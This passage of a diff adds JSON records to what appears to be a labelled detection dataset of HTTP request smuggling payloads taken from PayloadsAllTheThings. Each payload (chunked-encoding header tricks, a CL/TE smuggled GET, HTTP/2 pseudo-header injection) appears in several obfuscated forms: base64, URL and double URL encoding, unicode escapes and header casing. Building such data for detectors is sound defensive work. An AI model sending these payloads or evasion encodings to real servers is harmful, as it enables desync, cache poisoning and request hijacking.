+    "source": "Generated:raw_hsmug_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bea3926d854df4ed194228dafb27469ee4a2e60259d9d118ede1d23826bd7423",
+    "original_id": "raw_hsmug_00018",
+    "original_payload": "[space]Transfer-Encoding: chunked",
+    "obfuscated_payload": "W3NwYWNlXVRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2Vk",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 63864037,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00018__obf03",
+    "payload": "[space\\u005dTransfer-Encoding: chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bea3926d854df4ed194228dafb27469ee4a2e60259d9d118ede1d23826bd7423",
+    "original_id": "raw_hsmug_00018",
+    "original_payload": "[space]Transfer-Encoding: chunked",
+    "obfuscated_payload": "[space\\u005dTransfer-Encoding: chunked",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 63865046,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00018__obf04",
+    "payload": "%5Bspace%5DTransfer-Encoding%3A%20chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bea3926d854df4ed194228dafb27469ee4a2e60259d9d118ede1d23826bd7423",
+    "original_id": "raw_hsmug_00018",
+    "original_payload": "[space]Transfer-Encoding: chunked",
+    "obfuscated_payload": "%5Bspace%5DTransfer-Encoding%3A%20chunked",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63866055,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00019__obf01",
+    "payload": "X%3A%20X%5B%5Cn%5DTransfer-Encoding:%20chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4a101207f6ec4a701f78ad6b121b549803569dd2e75ae030dd41ecc3477b8c57",
+    "original_id": "raw_hsmug_00019",
+    "original_payload": "X: X[\\n]Transfer-Encoding: chunked",
+    "obfuscated_payload": "X%3A%20X%5B%5Cn%5DTransfer-Encoding:%20chunked",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63963031,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00019__obf02",
+    "payload": "WDogWFtcbl1UcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZA==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4a101207f6ec4a701f78ad6b121b549803569dd2e75ae030dd41ecc3477b8c57",
+    "original_id": "raw_hsmug_00019",
+    "original_payload": "X: X[\\n]Transfer-Encoding: chunked",
+    "obfuscated_payload": "WDogWFtcbl1UcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZA==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 63964040,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00019__obf03",
+    "payload": "X\\u003a X\\u005b\\n\\u005dTransfer-Encoding\\u003a chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4a101207f6ec4a701f78ad6b121b549803569dd2e75ae030dd41ecc3477b8c57",
+    "original_id": "raw_hsmug_00019",
+    "original_payload": "X: X[\\n]Transfer-Encoding: chunked",
+    "obfuscated_payload": "X\\u003a X\\u005b\\n\\u005dTransfer-Encoding\\u003a chunked",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 63965049,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00019__obf04",
+    "payload": "X%3A%20X%5B%5Cn%5DTransfer-Encoding%3A%20chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4a101207f6ec4a701f78ad6b121b549803569dd2e75ae030dd41ecc3477b8c57",
+    "original_id": "raw_hsmug_00019",
+    "original_payload": "X: X[\\n]Transfer-Encoding: chunked",
+    "obfuscated_payload": "X%3A%20X%5B%5Cn%5DTransfer-Encoding%3A%20chunked",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63966058,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00020__obf01",
+    "payload": ":method GET%0A:path %2F%0A:authority%20www.example.com%0Aheader ignored%5Cr\\n%5Cr%5CnGET%20%2F%20HTTP%2F1.1%5Cr%5CnHost%3A www.example.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b04c8f45abf0620acae2b1eb8661ab33ef1170bd8327e406924fe99f088c2af4",
+    "original_id": "raw_hsmug_00020",
+    "original_payload": ":method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": ":method GET%0A:path %2F%0A:authority%20www.example.com%0Aheader ignored%5Cr\\n%5Cr%5CnGET%20%2F%20HTTP%2F1.1%5Cr%5CnHost%3A www.example.com",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64063034,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00020__obf02",
+    "payload": "Om1ldGhvZCBHRVQKOnBhdGggLwo6YXV0aG9yaXR5IHd3dy5leGFtcGxlLmNvbQpoZWFkZXIgaWdub3JlZFxyXG5cclxuR0VUIC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29t",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b04c8f45abf0620acae2b1eb8661ab33ef1170bd8327e406924fe99f088c2af4",
+    "original_id": "raw_hsmug_00020",
+    "original_payload": ":method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "Om1ldGhvZCBHRVQKOnBhdGggLwo6YXV0aG9yaXR5IHd3dy5leGFtcGxlLmNvbQpoZWFkZXIgaWdub3JlZFxyXG5cclxuR0VUIC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29t",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 64064043,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00020__obf03",
+    "payload": "\\u003amethod GET\n\\u003apath /\n:authority www.example.com\nheader ignored\\u005cr\\u005cn\\r\\nGET / HTTP\\u002f1.1\\r\\nHost\\u003a www.example.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b04c8f45abf0620acae2b1eb8661ab33ef1170bd8327e406924fe99f088c2af4",
+    "original_id": "raw_hsmug_00020",
+    "original_payload": ":method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "\\u003amethod GET\n\\u003apath /\n:authority www.example.com\nheader ignored\\u005cr\\u005cn\\r\\nGET / HTTP\\u002f1.1\\r\\nHost\\u003a www.example.com",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64065052,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00020__obf04",
+    "payload": "%253Amethod%2520GET%250A%253Apath%2520%252F%250A%253Aauthority%2520www.example.com%250Aheader%2520ignored%255Cr%255Cn%255Cr%255CnGET%2520%252F%2520HTTP%252F1.1%255Cr%255CnHost%253A%2520www.example.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b04c8f45abf0620acae2b1eb8661ab33ef1170bd8327e406924fe99f088c2af4",
+    "original_id": "raw_hsmug_00020",
+    "original_payload": ":method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "%253Amethod%2520GET%250A%253Apath%2520%252F%250A%253Aauthority%2520www.example.com%250Aheader%2520ignored%255Cr%255Cn%255Cr%255CnGET%2520%252F%2520HTTP%252F1.1%255Cr%255CnHost%253A%2520www.example.com",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 64066061,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00021__obf01",
+    "payload": "header%20ignored%5Cr%5Cn%5Cr%5CnGET%20%2F%20HTTP%2F1.1%5Cr%5CnHost%3A%20www.example.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "64de010005a9aeaaf91354093f6b7309913d404ea7755acc5cc671db0a634404",
+    "original_id": "raw_hsmug_00021",
+    "original_payload": "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "header%20ignored%5Cr%5Cn%5Cr%5CnGET%20%2F%20HTTP%2F1.1%5Cr%5CnHost%3A%20www.example.com",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64163037,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00021__obf02",
+    "payload": "aGVhZGVyIGlnbm9yZWRcclxuXHJcbkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "64de010005a9aeaaf91354093f6b7309913d404ea7755acc5cc671db0a634404",
+    "original_id": "raw_hsmug_00021",
+    "original_payload": "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "aGVhZGVyIGlnbm9yZWRcclxuXHJcbkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 64164046,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00021__obf03",
+    "payload": "header ignored\\u005cr\\u005cn\\u005cr\\u005cnGET \\u002f HTTP\\u002f1.1\\u005cr\\u005cnHost\\u003a www.example.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "64de010005a9aeaaf91354093f6b7309913d404ea7755acc5cc671db0a634404",
+    "original_id": "raw_hsmug_00021",
+    "original_payload": "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "header ignored\\u005cr\\u005cn\\u005cr\\u005cnGET \\u002f HTTP\\u002f1.1\\u005cr\\u005cnHost\\u003a www.example.com",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64165055,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00021__obf04",
+    "payload": "aGVhZGVyIGlnbm9yZWRcclxuXHJcbkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "64de010005a9aeaaf91354093f6b7309913d404ea7755acc5cc671db0a634404",
+    "original_id": "raw_hsmug_00021",
+    "original_payload": "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "obfuscated_payload": "aGVhZGVyIGlnbm9yZWRcclxuXHJcbkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64166064,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00022__obf01",
+    "payload": "%50OST / HTTP/1.1\nHost: ww%77.exam%70l%65.co%6D\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.%65%78amp%6Ce.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ce42357335518857e88f70878ec69561daa50dc9073e79e7cdb8c67bbeab9aaf",
+    "original_id": "raw_hsmug_00022",
+    "original_payload": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com",
+    "obfuscated_payload": "%50OST / HTTP/1.1\nHost: ww%77.exam%70l%65.co%6D\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.%65%78amp%6Ce.com",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64263040,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00022__obf02",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQpDb250ZW50LUxlbmd0aDogMzcKCkdFVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ce42357335518857e88f70878ec69561daa50dc9073e79e7cdb8c67bbeab9aaf",
+    "original_id": "raw_hsmug_00022",
+    "original_payload": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQpDb250ZW50LUxlbmd0aDogMzcKCkdFVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 64264049,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00022__obf03",
+    "payload": "POST / HTTP/1.1\nhoSt: www.example.com\nconteNT-LEnGTH: 37\n\nGET / HTTP/1.1\nhOsT: www.example.com",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ce42357335518857e88f70878ec69561daa50dc9073e79e7cdb8c67bbeab9aaf",
+    "original_id": "raw_hsmug_00022",
+    "original_payload": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com",
+    "obfuscated_payload": "POST / HTTP/1.1\nhoSt: www.example.com\nconteNT-LEnGTH: 37\n\nGET / HTTP/1.1\nhOsT: www.example.com",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 64265058,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00022__obf04",
+    "payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQpDb250ZW50LUxlbmd0aDogMzcKCkdFVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ce42357335518857e88f70878ec69561daa50dc9073e79e7cdb8c67bbeab9aaf",
+    "original_id": "raw_hsmug_00022",
+    "original_payload": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com",
+    "obfuscated_payload": "UE9TVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQpDb250ZW50LUxlbmd0aDogMzcKCkdFVCAvIEhUVFAvMS4xCkhvc3Q6IHd3dy5leGFtcGxlLmNvbQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64266067,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00023__obf01",
+    "payload": "Content-Length%3A%2037",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "14a84b90314e9cb0cd4e799a758f63a45f782f73fe99ace6a1b792679e47db77",
+    "original_id": "raw_hsmug_00023",
+    "original_payload": "Content-Length: 37",
+    "obfuscated_payload": "Content-Length%3A%2037",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64363043,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00023__obf02",
+    "payload": "Q29udGVudC1MZW5ndGg6IDM3",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "14a84b90314e9cb0cd4e799a758f63a45f782f73fe99ace6a1b792679e47db77",
+    "original_id": "raw_hsmug_00023",
+    "original_payload": "Content-Length: 37",
+    "obfuscated_payload": "Q29udGVudC1MZW5ndGg6IDM3",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64364052,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00023__obf03",
+    "payload": "content-lENGTH: 37",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "14a84b90314e9cb0cd4e799a758f63a45f782f73fe99ace6a1b792679e47db77",
+    "original_id": "raw_hsmug_00023",
+    "original_payload": "Content-Length: 37",
+    "obfuscated_payload": "content-lENGTH: 37",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 64365061,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00023__obf04",
+    "payload": "Conte%6E%74-Length: 37",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "14a84b90314e9cb0cd4e799a758f63a45f782f73fe99ace6a1b792679e47db77",
+    "original_id": "raw_hsmug_00023",
+    "original_payload": "Content-Length: 37",
+    "obfuscated_payload": "Conte%6E%74-Length: 37",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64366070,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00024__obf01",
+    "payload": "%47ET / HTTP/1.1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc5d49bbaf39f98b659cbafac841654f529b9690293d106902a27acb82aad4b6",
+    "original_id": "raw_hsmug_00024",
+    "original_payload": "GET / HTTP/1.1",
+    "obfuscated_payload": "%47ET / HTTP/1.1",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64463046,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00024__obf02",
+    "payload": "R0VUIC8gSFRUUC8xLjE",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
